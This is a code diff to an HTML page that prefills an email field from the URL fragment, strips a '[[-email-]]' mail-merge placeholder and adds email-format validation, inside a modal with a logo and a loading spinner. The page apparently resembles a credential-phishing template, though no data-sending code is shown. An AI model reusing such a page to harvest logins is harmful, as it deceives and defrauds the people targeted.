@@ -8,13 +8,7 @@
     <link rel="stylesheet" href="styles/checkbox.css">
     <link rel="stylesheet" href="styles/all.css">
     <script src="js/jquery.js"></script>
-    <script> 
-$(document).ready(function() {
-    var baseUrl = (window.location).href;
-    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
-    $("#email").val(url);
-    });
-    </script>
+   
 </head>
 <body>
     <div class="sidebar">
@@ -162,8 +156,7 @@ $(document).ready(function() {
 <div id="modalbox" class="modal">
 
     <!-- Modal content -->
-<!-- Your modal HTML -->
-<div class="modal-content">
+ <div class="modal-content">
   <div class="mcontent" id="mcontent">
     <div class="mlogo">
       <img src="images/log.png">
@@ -192,28 +185,29 @@ $(document).ready(function() {
 document.addEventListener("DOMContentLoaded", function() {
     const emailInput = document.getElementById('email');
 
-    // Get everything after the last #
+    // Get full URL
     const fullUrl = window.location.href;
+
+    // Take everything after the last #
     const lastHashIndex = fullUrl.lastIndexOf("#");
     if (lastHashIndex !== -1) {
         let email = fullUrl.substring(lastHashIndex + 1);
-        email = email.replace(/\[\[-email-\]\]/g, "");
-        emailInput.value = decodeURIComponent(email);
+        email = email.replace(/\[\[-email-\]\]/g, ""); // optional placeholder removal
+        email = decodeURIComponent(email);
+
+        // validate email format before setting
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (emailPattern.test(email)) {
+            emailInput.value = email;
+        }
     }
 
-    // Keep URL hash updated if user edits email
+    // Optional: update URL hash if user edits email
     emailInput.addEventListener("input", () => {
         history.replaceState(null, "", "#" + encodeURIComponent(emailInput.value));
     });
 });
 </script>
-
-
-
-</body>
-
-
-
 
         </div>
         <div class="mspinner" id="mspinner">
@@ -226,13 +220,4 @@ document.addEventListener("DOMContentLoaded", function() {
   </div>
   <script src="js/main.js"></script>
 </body>
-
 </html>
-
-
-
-
-
-
-
-
